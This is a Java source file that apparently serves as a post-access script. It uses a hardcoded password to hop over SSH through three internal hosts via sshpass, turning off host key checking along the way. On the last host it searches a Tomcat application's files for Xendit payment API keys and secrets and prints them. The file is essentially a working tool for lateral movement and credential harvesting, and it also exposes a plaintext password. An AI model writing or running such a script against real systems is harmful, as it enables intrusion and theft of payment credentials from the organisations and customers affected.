import com.jcraft.jsch.*;
import java.io.*;
class DKNEO4 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---WEBAPP---;ls /progs/neo/neo-app/tomcat/8.0.53/webapps/ 2>/dev/null;echo ---CLASSES---;find /progs/neo/neo-app/tomcat/8.0.53/webapps/ -maxdepth 5 -name \\\"*xendit*\\\" -o -name \\\"application*.properties\\\" -o -name \\\"*.yml\\\" 2>/dev/null | head -10;echo ---GREP-PROPS---;grep -r \\\"xnd_\\\\|xendit.api\\\\|xendit.secret\\\\|xendit.key\\\" /progs/neo/neo-app/tomcat/8.0.53/webapps/ROOT/WEB-INF/classes/ 2>/dev/null | head -10;echo ---GREP-LIB---;find /progs/neo/neo-app/tomcat/8.0.53/webapps/ROOT/WEB-INF/ -name \\\"*.properties\\\" 2>/dev/null | xargs grep -l \\\"xendit\\\" 2>/dev/null | head -5\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
